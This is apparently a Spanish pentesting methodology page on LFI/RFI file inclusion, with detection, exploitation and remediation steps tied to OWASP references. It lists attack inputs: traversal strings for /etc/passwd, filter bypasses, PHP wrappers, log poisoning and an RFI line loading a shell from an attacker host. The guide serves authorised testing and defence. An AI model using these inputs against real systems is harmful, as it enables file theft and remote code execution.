# File Inclusion (LFI / RFI)

- **WSTG:** `WSTG-INPV-11` (Code Injection: 11.1 LFI, 11.2 RFI). Relacionado con `WSTG-AUTHZ-01`.
- **OWASP Top 10:** `A03:2021 – Injection` / `A01:2021 – Broken Access Control`
- **Alias:** Local/Remote File Inclusion, inclusión de ficheros

## Qué es

La aplicación incluye un fichero cuya ruta procede de entrada del usuario sin validar. **LFI** incluye ficheros locales del servidor; **RFI** incluye un fichero remoto controlado por el atacante (requiere configuraciones permisivas). Puede derivar en lectura de ficheros sensibles o en ejecución de código.

## Cómo detectarla

- Parámetros que cargan páginas/plantillas/idiomas: `?page=`, `?file=`, `?lang=`, `?template=`.
- Prueba traversal: `../../../../etc/passwd`, `..\\..\\windows\\win.ini`.
- Bypass de filtros: codificación (`%2e%2e%2f`), null byte (legacy `%00`), truncado, doble codificación.

## Cómo explotarla

- **LFI a lectura:** ficheros de config, logs, `/etc/passwd`, código fuente vía wrappers PHP (`php://filter` para leer código en base64).
- **LFI a RCE:** log poisoning (inyectar código en logs y luego incluirlos), wrappers (`data://`, `expect://`), o incluir ficheros subidos.
- **RFI:** incluir una URL con tu payload (`?page=http://tu-ip/shell.txt`).

## Impacto

Desde divulgación de código fuente y ficheros sensibles hasta ejecución remota de código (crítico) según la explotabilidad.

## Cómo remediar

- No usar entrada del usuario para rutas de inclusión; usar un índice/lista blanca de ficheros permitidos.
- Deshabilitar inclusión remota (`allow_url_include=Off`).
- Canonizar y validar rutas; confinar con `basename()`/chroot.

## Referencias

- OWASP WSTG `WSTG-INPV-11` · CWE-98 / CWE-22
- PortSwigger — File path traversal

## Enlaces internos

- Checklist: `../../00-metodologia/06-checklists/07-input-validation.md`
- Redacción para informe: `../../00-metodologia/05-informe/catalogo-redacciones.md`
